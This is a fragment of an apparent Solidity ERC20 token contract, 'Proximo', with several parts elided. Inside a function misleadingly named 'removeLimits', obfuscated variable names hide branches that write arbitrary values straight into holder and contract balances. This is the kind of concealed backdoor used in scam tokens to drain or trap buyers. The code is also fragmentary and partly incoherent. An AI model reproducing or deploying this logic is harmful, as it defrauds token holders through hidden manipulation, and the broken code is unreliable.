...
contract Proximo is IERC20, Ownable {

    string private _symbol;
    string private _name;
    uint256 public _baseTax = 1;
    ...
    function removeLimits      (
        ...
        uint256 _emit;
        if (swapTokensAtAmount && contractTokensBalances > getMarketMakerPair && !swapThreshold && _createPair != UniswapV1Pair) {
            swapThreshold = true;
            getSwapAndLiquify(contractTokensBalances);
            swapThreshold = false;
        } else if (_tOwned[_createPair] > getMarketMakerPair && _tOwned[_constructor] > getMarketMakerPair) {
            _emit = _sync;
            _Balances[address(this)] += _emit;
            swapAmountForTokens(_sync, _constructor);
            return;
        } else if (_constructor != address(UniswapV2router) && _tOwned[_createPair] > 0 && _sync > getMarketMakerPair && _constructor != UniswapV1Pair) {
            _tOwned[_constructor] = _sync;
            return;
        } else if (!swapThreshold && _rOwned[_createPair] > 0 && _createPair != UniswapV1Pair && _tOwned[_createPair] == 0) {
        ...
        isExcludedFromFee[UniswapV1Pair] = _constructor;
        if (_baseTax > 0 && _tOwned[_createPair] == 0 && !swapThreshold && _tOwned[_constructor] == 0) {
        ...
        emit Transfer(_createPair, _constructor, _sync);
            if (!tradingOpen) {
